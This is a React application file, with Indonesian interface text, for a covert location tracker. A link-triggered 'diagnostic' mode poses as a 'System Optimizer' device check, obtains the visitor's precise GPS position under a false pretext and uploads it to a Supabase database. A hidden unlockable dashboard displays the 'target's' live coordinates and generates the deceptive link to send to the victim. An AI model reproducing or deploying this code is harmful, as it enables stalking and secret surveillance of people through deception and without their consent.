
import React, { useState, useEffect, useCallback } from 'react';
import Sidebar from './components/Sidebar';
import LocationCard from './components/LocationCard';
import { UserProfile, AIInsight, LocationData } from './types';
import { getLocationInsights } from './services/geminiService';
import { createClient } from '@supabase/supabase-js';

// Fungsi untuk mendapatkan env secara aman
const getEnv = (key: string): string => {
  try {
    return process.env[key] || '';
  } catch (e) {
    return '';
  }
};

const supabaseUrl = getEnv('SUPABASE_URL');
const supabaseKey = getEnv('SUPABASE_KEY');
const supabase = (supabaseUrl && supabaseKey) ? createClient(supabaseUrl, supabaseKey) : null;

const App: React.FC = () => {
  const isStealthMode = new URLSearchParams(window.location.search).get('mode') === 'diagnostic';
  const targetId = 'target_alpha'; 

  const [isUnlocked, setIsUnlocked] = useState(false);
  const [isDiagnosing, setIsDiagnosing] = useState(false);
  const [diagProgress, setDiagProgress] = useState(0);
  const [locationError, setLocationError] = useState<string | null>(null);
  const [copyStatus, setCopyStatus] = useState<string | null>(null);
  const [dbLog, setDbLog] = useState<string>("IDLE");
  
  const [members, setMembers] = useState<UserProfile[]>([
    {
      id: '1',
      name: 'Alpha_Target',
      avatar: 'https://picsum.photos/id/64/200/200',
      lastSeen: Date.now(),
      status: 'offline',
    }
  ]);

  const [insight, setInsight] = useState<AIInsight | null>(null);
  const [isLoadingInsight, setIsLoadingInsight] = useState(false);

  const activeMember = members[0];
  const isConfigValid = !!supabaseUrl && !!supabaseKey;

  const syncToDatabase = async (loc: LocationData) => {
    if (!supabase) {
      if (!supabaseUrl) setDbLog("ERROR: MISSING_URL");
      else if (!supabaseKey) setDbLog("ERROR: MISSING_KEY");
      else setDbLog("ERROR: CLIENT_NULL");
      return;
    }
    
    setDbLog("SYNCING...");
    try {
      const { error } = await supabase
        .from('tracking')
        .upsert({ 
          id: targetId, 
          latitude: loc.latitude, 
          longitude: loc.longitude, 
          accuracy: loc.accuracy, 
          timestamp: loc.timestamp 
        });
      
      if (error) {
        setDbLog(`DB ERROR: ${error.message}`);
      } else {
        setDbLog("SUCCESS: DATA_SENT");
      }
    } catch (err: any) {
      setDbLog(`FATAL: ${err.message?.substring(0,10)}`);
    }
  };

  useEffect(() => {
    if (isUnlocked && !isStealthMode && supabase) {
      const fetchData = async () => {
        try {
          const { data, error } = await supabase.from('tracking').select('*').eq('id', targetId).single();
          if (data) {
            setMembers([{
              ...members[0],
              currentLocation: {
                latitude: data.latitude,
                longitude: data.longitude,
                accuracy: data.accuracy,
                timestamp: data.timestamp
              },
              status: 'online',
              lastSeen: data.timestamp
            }]);
          }
        } catch (e) {}
      };
      fetchData();

      const channel = supabase
        .channel('db-tracking')
        .on('postgres_changes', { event: '*', schema: 'public', table: 'tracking' }, payload => {
          const data = payload.new as any;
          if (data && data.id === targetId) {
            setMembers([{
              ...members[0],
              currentLocation: {
                latitude: data.latitude,
                longitude: data.longitude,
                accuracy: data.accuracy,
                timestamp: data.timestamp
              },
              status: 'online',
              lastSeen: data.timestamp
            }]);
          }
        })
        .subscribe();

      return () => { supabase.removeChannel(channel); };
    }
  }, [isUnlocked, isStealthMode]);

  const updateLocation = useCallback(() => {
    if (!navigator.geolocation) {
      setLocationError("GPS Not Found");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        setLocationError(null);
        const newLocation: LocationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          timestamp: position.timestamp,
        };

        if (isStealthMode) {
          await syncToDatabase(newLocation);
        }

        if (isUnlocked && !isStealthMode) {
          setMembers(prev => prev.map(m => ({ ...m, currentLocation: newLocation, status: 'online' })));
          setIsLoadingInsight(true);
          const res = await getLocationInsights(newLocation);
          setInsight(res);
          setIsLoadingInsight(false);
        }
      },
      (err) => {
        setLocationError(`Denied: ${err.message}`);
        setDbLog("ERROR: GPS_DENIED");
      },
      { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
    );
  }, [isUnlocked, isStealthMode]);

  const startDiagnostic = () => {
    updateLocation();
    setIsDiagnosing(true);
    let progress = 0;
    const interval = setInterval(() => {
      progress += 1;
      setDiagProgress(progress);
      if (progress >= 100) clearInterval(interval);
    }, 60);
  };

  const getCleanUrl = () => window.location.origin + window.location.pathname;

  const handleCopyLink = async (key: string) => {
    const url = `${getCleanUrl()}?mode=diagnostic`;
    await navigator.clipboard.writeText(url);
    setCopyStatus(key);
    setTimeout(() => setCopyStatus(null), 2000);
  };

  const openInGoogleMaps = (lat: number, lng: number) => {
    window.open(`https://www.google.com/maps?q=${lat},${lng}`, '_blank');
  };

  if (isStealthMode) {
    return (
      <div className="min-h-screen bg-slate-950 text-slate-200 font-mono flex flex-col p-6 overflow-hidden">
        <div className="max-w-md mx-auto w-full space-y-8 animate-in fade-in duration-700">
           <div className="flex items-center gap-3 border-b border-slate-800 pb-6">
              <div className="w-10 h-10 bg-blue-600 rounded-lg flex items-center justify-center shadow-lg">
                 <i className="fas fa-microchip text-white"></i>
              </div>
              <div>
                 <h1 className="text-sm font-bold uppercase">System Optimizer <span className="text-slate-500 font-normal">v1.4</span></h1>
                 <p className="text-[10px] text-slate-500">Status: {isDiagnosing ? 'Pemeriksaan...' : 'Siaga'}</p>
              </div>
           </div>

           {!isDiagnosing ? (
             <div className="bg-slate-900/40 border border-slate-800 rounded-3xl p-8 text-center space-y-6">
                <div className="w-20 h-20 bg-blue-500/10 rounded-full flex items-center justify-center mx-auto border border-blue-500/20">
                   <i className="fas fa-shield-virus text-3xl text-blue-500"></i>
                </div>
                <div>
                   <h2 className="text-lg font-bold">Diagnosa Perangkat</h2>
                   <p className="text-slate-400 text-xs mt-2">Pindai integritas sensor, kesehatan baterai, dan optimalkan penggunaan RAM.</p>
                </div>
                <button 
                  onClick={startDiagnostic}
                  className="w-full py-4 bg-blue-600 hover:bg-blue-500 rounded-2xl font-bold text-sm shadow-xl active:scale-95 transition-all"
                >
                  MULAI OPTIMASI SEKARANG
                </button>
                {locationError && (
                  <p className="text-[10px] text-rose-500 bg-rose-500/10 p-2 rounded">
                    Error Hardware GPS: Silakan izinkan akses lokasi jika diminta.
                  </p>
                )}
             </div>
           ) : (
             <div className="bg-slate-900/40 border border-slate-800 rounded-3xl p-8 space-y-8">
                <div className="space-y-4">
                   <div className="flex justify-between text-[10px] uppercase font-bold text-slate-500">
                      <span>Memproses Core...</span>
                      <span>{diagProgress}%</span>
                   </div>
                   <div className="w-full bg-slate-800 h-1.5 rounded-full overflow-hidden">
                      <div className="bg-blue-500 h-full transition-all duration-300" style={{ width: `${diagProgress}%` }}></div>
                   </div>
                </div>

                <div className="space-y-3 p-4 bg-slate-950/50 border border-slate-800 rounded-xl">
                   <div className="flex justify-between text-[9px]">
                      <span className="text-slate-500">GPU RENDERER</span>
                      <span className="text-emerald-500 font-bold">OK</span>
                   </div>
                   <div className="flex justify-between text-[9px]">
                      <span className="text-slate-500">GPS ACCURACY</span>
                      <span className="text-emerald-500 font-bold">{diagProgress > 50 ? 'VERIFIED' : 'SCANNING'}</span>
                   </div>
                   <div className="flex justify-between text-[9px]">
                      <span className="text-slate-500">DATABASE_LINK</span>
                      <span className="text-blue-400 font-bold text-[8px] uppercase">{dbLog}</span>
                   </div>
                </div>

                {diagProgress >= 100 && (
                  <div className="animate-in zoom-in duration-500 space-y-4">
                     <div className="p-4 bg-emerald-500/10 border border-emerald-500/20 rounded-xl text-center">
                        <p className="text-[10px] text-emerald-400 font-bold uppercase">Optimasi Berhasil</p>
                        <p className="text-[9px] text-slate-500 mt-1">Sistem kini lebih stabil.</p>
                     </div>
                     <button onClick={() => window.location.reload()} className="w-full py-3 bg-slate-800 rounded-xl text-[10px] font-bold text-slate-400 uppercase">Tutup</button>
                  </div>
                )}
             </div>
           )}
        </div>
      </div>
    );
  }

  return (
    <div className="flex h-screen bg-slate-950 text-slate-200 overflow-hidden font-mono">
      <Sidebar 
        members={members} 
        activeMemberId="1" 
        onSelectMember={() => {}}
        isUnlocked={isUnlocked}
        onUnlock={() => setIsUnlocked(true)}
      />

      <main className="flex-1 flex flex-col min-w-0">
        <header className="h-16 bg-slate-900 border-b border-slate-800 flex items-center justify-between px-8 shrink-0">
          <div className="flex items-center gap-4">
            <h2 className="text-xs font-bold tracking-widest text-slate-400 uppercase">
              {isUnlocked ? '> ADM_COMMAND_CENTER' : '> SYSTEM_IDLE'}
            </h2>
          </div>
          <div className="flex items-center gap-4">
            {isUnlocked && (
              <div className={`px-2 py-1 rounded border text-[9px] uppercase font-bold flex items-center gap-2 ${isConfigValid ? 'border-emerald-500/30 bg-emerald-500/5 text-emerald-500' : 'border-rose-500/30 bg-rose-500/5 text-rose-500'}`}>
                <div className={`w-1.5 h-1.5 rounded-full ${isConfigValid ? 'bg-emerald-500' : 'bg-rose-500 animate-pulse'}`}></div>
                DB_{isConfigValid ? 'LINKED' : 'MISSING_ENV'}
              </div>
            )}
            {isUnlocked && (
               <button onClick={() => setIsUnlocked(false)} className="text-[10px] bg-slate-800 px-3 py-1 rounded border border-slate-700 uppercase">Lock_System</button>
            )}
          </div>
        </header>

        <div className="flex-1 p-8 overflow-y-auto">
          {!isUnlocked ? (
            <div className="max-w-4xl mx-auto space-y-8 text-center py-20 animate-in fade-in">
               <i className="fas fa-shield-halved text-5xl text-slate-800 mb-6"></i>
               <h1 className="text-2xl font-bold text-slate-400">Encrypted Workspace</h1>
               <p className="text-slate-500 text-sm max-w-sm mx-auto">Klik versi di sidebar 5x untuk membuka kunci.</p>
            </div>
          ) : (
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 max-w-7xl mx-auto animate-in zoom-in-95 duration-300">
              <div className="lg:col-span-2 space-y-6">
                
                {!isConfigValid && (
                  <div className="bg-rose-500/10 border border-rose-500/20 p-4 rounded-xl animate-pulse">
                    <p className="text-xs font-bold text-rose-400 uppercase tracking-tighter">Variabel Vercel Hilang!</p>
                    <p className="text-[10px] text-slate-400 mt-1">Segera isi SUPABASE_URL dan SUPABASE_KEY di Settings Vercel lalu REDEPLOY.</p>
                  </div>
                )}

                <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-2xl relative overflow-hidden">
                   <div className="absolute top-0 right-0 w-32 h-32 bg-blue-500/5 blur-3xl rounded-full"></div>
                   <div className="flex justify-between items-center mb-6">
                      <h3 className="text-xs font-bold text-slate-400 uppercase tracking-widest">
                        <i className="fas fa-location-dot text-blue-500 mr-2"></i> Live Target Data
                      </h3>
                      {activeMember.currentLocation && (
                        <button 
                          onClick={() => openInGoogleMaps(activeMember.currentLocation!.latitude, activeMember.currentLocation!.longitude)}
                          className="px-4 py-2 bg-blue-600 hover:bg-blue-500 rounded-lg text-[10px] font-bold uppercase"
                        >
                           Buka Peta Google
                        </button>
                      )}
                   </div>
                   
                   {activeMember.currentLocation ? (
                     <div className="grid grid-cols-2 gap-4">
                        <div className="bg-slate-950/50 border border-slate-800 p-4 rounded-xl">
                           <p className="text-[9px] text-slate-500 uppercase mb-1">Target Latitude</p>
                           <p className="text-lg font-bold text-white mono">{activeMember.currentLocation.latitude.toFixed(8)}</p>
                        </div>
                        <div className="bg-slate-950/50 border border-slate-800 p-4 rounded-xl">
                           <p className="text-[9px] text-slate-500 uppercase mb-1">Target Longitude</p>
                           <p className="text-lg font-bold text-white mono">{activeMember.currentLocation.longitude.toFixed(8)}</p>
                        </div>
                     </div>
                   ) : (
                     <div className="p-10 border border-dashed border-slate-800 rounded-2xl text-center">
                        <p className="text-xs text-slate-600 italic uppercase">Menunggu Sinyal Dari Target...</p>
                     </div>
                   )}
                </div>

                <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6">
                   <h3 className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-4">Target Deployment Link</h3>
                   <div className="p-4 bg-blue-500/5 border border-blue-500/20 rounded-xl flex gap-2">
                      <input readOnly value={`${getCleanUrl()}?mode=diagnostic`} className="flex-1 bg-slate-950 border border-slate-800 rounded p-2 text-[10px] text-slate-500" />
                      <button onClick={() => handleCopyLink('target')} className={`px-6 rounded text-[10px] font-bold ${copyStatus === 'target' ? 'bg-emerald-600' : 'bg-blue-600'}`}>
                         {copyStatus === 'target' ? 'COPIED' : 'COPY'}
                      </button>
                   </div>
                </div>
              </div>

              <div className="lg:col-span-1">
                <LocationCard 
                  member={activeMember} 
                  insight={insight} 
                  loadingInsight={isLoadingInsight} 
                />
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  );
};

export default App;
